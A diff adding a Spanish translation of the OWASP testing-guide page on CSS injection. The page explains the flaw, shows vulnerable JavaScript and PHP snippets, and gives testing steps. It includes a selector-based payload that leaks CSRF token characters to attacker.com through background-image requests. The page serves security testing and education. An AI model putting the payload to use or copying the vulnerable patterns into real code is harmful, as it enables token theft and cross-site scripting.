@@ -1,0 +1,62 @@
+<h1 id="css-injection">Inyección de CSS</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-CLNT-05</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>Una vulnerabilidad de inyección de CSS implica la capacidad de inyectar código CSS arbitrario en el contexto de un sitio de confianza que se renderiza dentro del navegador de la víctima. El impacto de este tipo de vulnerabilidad varía según el payload de CSS proporcionado. Puede conducir a cross-site scripting o a la exfiltración de datos.</p>
+<p>Esta vulnerabilidad ocurre cuando la aplicación permite que el CSS proporcionado por el usuario interfiera con las hojas de estilo legítimas de la aplicación. Inyectar código en el contexto CSS puede dar al atacante la capacidad de ejecutar JavaScript en ciertas condiciones, o de extraer valores sensibles mediante selectores y funciones de CSS capaces de generar peticiones HTTP. En general, permitir a los usuarios personalizar las páginas proporcionando archivos CSS propios es un riesgo considerable.</p>
+<p>El siguiente código JavaScript muestra un posible script vulnerable en el que el atacante puede controlar <code>location.hash</code> (fuente), que llega a la función <code>cssText</code> (sumidero). Este caso particular puede conducir a XSS basado en DOM en versiones antiguas de navegadores; para más información, consulte la <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">DOM-based XSS Prevention Cheat Sheet</a>.</p>
+<pre><code class="language-html">&lt;a id=&quot;a1&quot;&gt;Click me&lt;/a&gt;
+&lt;script&gt;
+    if (location.hash.slice(1)) {
+    document.getElementById(&quot;a1&quot;).style.cssText = &quot;color: &quot; + location.hash.slice(1);
+    }
+&lt;/script&gt;
+</code></pre>
+<blockquote>
+<p>Nota: Algunas técnicas de ejecución de JavaScript basadas en CSS dependen del comportamiento de navegadores antiguos (por ejemplo, versiones antiguas de IE y Opera). Aunque los navegadores modernos mitigan la mayoría de estos vectores, la inyección de CSS aún puede permitir la exfiltración de datos, la manipulación de la interfaz de usuario y el encadenamiento de ataques.</p>
+</blockquote>
+<p>La misma vulnerabilidad puede aparecer en el caso de XSS reflejado, por ejemplo, en el siguiente código PHP:</p>
+<pre><code class="language-html">&lt;style&gt;
+p {
+    color: &lt;?php echo $_GET[&#39;color&#39;]; ?&gt;;
+    text-align: center;
+}
+&lt;/style&gt;
+</code></pre>
+<p>Otros escenarios de ataque implican la capacidad de extraer datos mediante el uso de reglas CSS puras. Estos ataques pueden realizarse a través de selectores CSS, lo que lleva a la exfiltración de datos, por ejemplo, tokens CSRF.</p>
+<p>A continuación se muestra un ejemplo de código que intenta seleccionar un input cuyo <code>name</code> coincide con <code>csrf_token</code> y cuyo <code>value</code> comienza con una <code>a</code>. Utilizando un ataque de fuerza bruta para determinar el <code>value</code> del atributo, es posible llevar a cabo un ataque que envíe el valor al dominio del atacante, por ejemplo intentando establecer una imagen de fondo en el elemento input seleccionado.</p>
+<pre><code class="language-html">&lt;style&gt;
+input[name=csrf_token][value=^a] {
+    background-image: url(https://attacker.com/log?a);
+}
+&lt;/style&gt;
+</code></pre>
+<p>Otros ataques que utilizan contenido solicitado, como CSS, se destacan en la <a href="https://www.youtube.com/watch?v=FIQvAaZj_HA" target="_blank" rel="noopener">charla de Mario Heiderich, &quot;Got Your Nose&quot;</a> en YouTube.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar puntos de inyección de CSS.</li>
+<li>Evaluar el impacto de la inyección.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Se debe analizar el código para determinar si se permite a un usuario inyectar contenido en el contexto CSS. En particular, hay que inspeccionar la manera en que el sitio devuelve reglas CSS en función de las entradas.</p>
+<p>El siguiente es un ejemplo básico:</p>
+<pre><code class="language-html">&lt;a id=&quot;a1&quot;&gt;Click me&lt;/a&gt;
+&lt;b&gt;Hi&lt;/b&gt;
+&lt;script&gt;
+    $(&quot;a&quot;).click(function(){
+        $(&quot;b&quot;).attr(&quot;style&quot;,&quot;color: &quot; + location.hash.slice(1));
+    });
+&lt;/script&gt;
+</code></pre>
+<p>El código anterior contiene una fuente, <code>location.hash</code>, controlada por el atacante, que puede inyectar directamente en el atributo <code>style</code> de un elemento HTML. Como se mencionó antes, esto puede producir resultados diferentes según el navegador utilizado y el payload proporcionado.</p>
+<p>Las siguientes páginas ofrecen ejemplos de vulnerabilidades de inyección de CSS:</p>
+<ul>
+<li><a href="https://html5sec.org/invalid/?length=25" target="_blank" rel="noopener">Password &quot;cracker&quot; via CSS and HTML5</a></li>
+<li><a href="https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink" target="_blank" rel="noopener">JavaScript based attacks using <code>CSSStyleDeclaration</code> with unescaped input</a></li>
+</ul>
+<p>Para más recursos de OWASP sobre cómo prevenir la inyección de CSS, consulte la <a href="https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html" target="_blank" rel="noopener">Securing Cascading Style Sheets Cheat Sheet</a>.</p>
